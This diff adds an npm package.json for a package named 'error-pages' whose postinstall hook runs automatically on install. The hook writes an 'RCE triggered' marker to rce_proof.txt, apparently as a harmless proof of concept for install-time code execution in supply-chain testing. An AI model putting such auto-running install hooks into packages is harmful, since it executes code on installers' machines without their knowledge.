@@ -1,0 +1,7 @@
+{
+  "name": "error-pages",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "echo '✅ RCE triggered from error-pages!' > rce_proof.txt"
+  }
+}
